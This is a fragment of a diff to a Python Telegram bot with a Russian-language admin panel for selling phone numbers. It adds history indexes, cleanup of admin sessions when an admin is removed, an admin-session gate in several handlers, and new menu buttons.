+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_user ON history_events(user_id)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_phone ON history_events(phone)")
         _adm_cols = [r[1] for r in conn.execute("PRAGMA table_info(admins)").fetchall()]
         if 'role' not in _adm_cols:
             conn.execute("ALTER TABLE admins ADD COLUMN role TEXT DEFAULT 'moderator'")
@@ -560,6 +1334,11 @@ def delete_admin_from_db(user_id):
     try:
         conn = sqlite3.connect(DB_NAME, timeout=10)
         conn.execute("DELETE FROM admins WHERE user_id=?", (user_id,))
+        try:
+            conn.execute("DELETE FROM admin_sessions WHERE user_id=?", (user_id,))
+        except sqlite3.Error:
+            pass
+        ADMIN_SESSIONS.pop(int(user_id), None)
         conn.commit()
         conn.close()
         return True
@@ -1267,6 +2046,13 @@ async def main_menu_text(update, context):
         pass
     context.user_data.clear()
     if subscriptions.get(uid) == "agreed":
+        gate = admin_session_gate(uid)
+        if gate:
+            try:
+                await update.effective_message.reply_text(gate, parse_mode="Markdown", reply_markup=_admin_session_kb())
+            except Exception:
+                pass
+            return ConversationHandler.END
         await show_main_menu(update, uid)
     else:
         await start(update, context)
@@ -1575,7 +2361,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await ref_try_credit(context, user_id)
     except Exception as e:
         logger.warning(f"[REF] start: {e}")
+    if subscriptions.get(user_id) != "agreed" and not is_admin(user_id) and _get_setting(f"terms_{user_id}") == "agreed":
+        subscriptions[user_id] = "agreed"     # правила принял раньше — после перезапуска помним
     if subscriptions.get(user_id) == "agreed":
+        gate = admin_session_gate(user_id)
+        if gate:
+            await update.message.reply_text(gate, parse_mode="Markdown", reply_markup=_admin_session_kb())
+            return
         await show_main_menu(update, user_id)
         return
     if subscriptions.get(user_id) is True:
@@ -1895,6 +2687,11 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ Нет доступа!", reply_markup=back("start"))
         return
 
+    gate = admin_session_gate(user_id)
+    if gate:
+        await query.edit_message_text(gate, parse_mode="Markdown", reply_markup=_admin_session_kb())
+        return
+
     # частые действия — сетка 2 в ряд
     row1 = [btn("🛒 КУПИТЬ (LZT)", "lzt_buy_menu")]
     if is_super_admin(user_id):
@@ -1904,11 +2701,16 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [btn("📱 ДОБАВИТЬ НОМЕР", "add_phone"), btn("✏️ ЦЕНЫ", "edit_price")],
         [btn("🎁 КОМПЕНСАЦИЯ", "compensate"), btn("⚙️ НАСТРОЙКИ", "admin_settings")],
         [btn("📵 УДАЛЁННЫЙ НОМЕР", "removed_num")],
+        [btn("📜 ИСТОРИЯ", "hist_menu"), btn("👤 МОЙ АККАУНТ", "admacc")],
         [btn("🏠 ГЛАВНОЕ МЕНЮ", "start")],
     ]
     role = "👑 ГЛАВНЫЙ АДМИН" if is_super_admin(user_id) else "🛠️ МОДЕРАТОР"
-    await query.edit_message_text(f"👥 *АДМИН-ПАНЕЛЬ*\n\nВаша роль: {role}\nВыберите действие:",
-                                  parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))
+    sess = admin_get_linked(user_id) or {}
+    await query.edit_message_text(
+        f"👥 *АДМИН-ПАНЕЛЬ*\n\nВаша роль: {role}\n"
+        f"🔐 Аккаунт (сессия): `{fmt_phone(sess.get('phone') or '—')}`\n"
+        f"Выберите действие:",
+        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))
 
 
 async def admin_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
